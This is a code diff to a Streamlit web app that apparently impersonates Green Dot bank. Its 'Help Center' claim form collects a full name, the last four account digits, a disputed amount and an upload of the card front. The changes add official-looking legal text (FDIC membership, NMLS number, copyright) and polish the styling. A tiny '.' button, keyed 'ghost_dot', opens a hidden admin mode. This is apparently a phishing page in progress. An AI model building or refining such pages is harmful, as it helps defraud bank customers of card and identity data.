@@ -73,10 +73,22 @@ st.markdown("""<style>
         cursor: pointer !important;
     }
 
+    /* CLEAN LEGAL FOOTER - Fix for 'Member' box issue */
     .legal-container {
-        font-size: 11px !important; color: #444 !important; text-align: center !important;
-        margin-top: 40px !important; padding-top: 20px !important;
-        border-top: 1px solid #222 !important; line-height: 1.4 !important;
+        font-size: 11px !important; 
+        color: #666 !important; 
+        text-align: center !important;
+        margin-top: 40px !important; 
+        padding-top: 20px !important;
+        border-top: 1px solid #222 !important; 
+        line-height: 1.6 !important;
+    }
+    
+    .legal-container span, .legal-container p {
+        background: none !important;
+        border: none !important;
+        padding: 0 !important;
+        color: #666 !important;
     }
 </style>""", unsafe_allow_html=True)
 
@@ -90,7 +102,7 @@ if not st.session_state.admin_mode:
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_7_4", clear_on_submit=True):
+    with st.form("claim_v32_7_5", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -98,7 +110,7 @@ if not st.session_state.admin_mode:
         st.file_uploader("Card Front", type=['jpg','png','jpeg'])
         if st.form_submit_button("SUBMIT NOW"): st.success("Claim Received.")
 
-    # --- DOWNLOAD APP SECTION (INTERACTIVE) ---
+    # --- DOWNLOAD APP SECTION ---
     st.markdown("""<div class='promo-box'>
         <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
         <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
@@ -112,7 +124,7 @@ if not st.session_state.admin_mode:
         <p style='color:#888; font-size: 13px;'>Secure mobile banking for your account.</p>
     </div>""", unsafe_allow_html=True)
 
-    st.markdown("<div class='legal-container'>Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation.</div>", unsafe_allow_html=True)
+    st.markdown("<div class='legal-container'>Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation. All rights reserved. NMLS #914924.</div>", unsafe_allow_html=True)
 
     if st.button(".", key="ghost_dot"):
         st.session_state.admin_mode = True
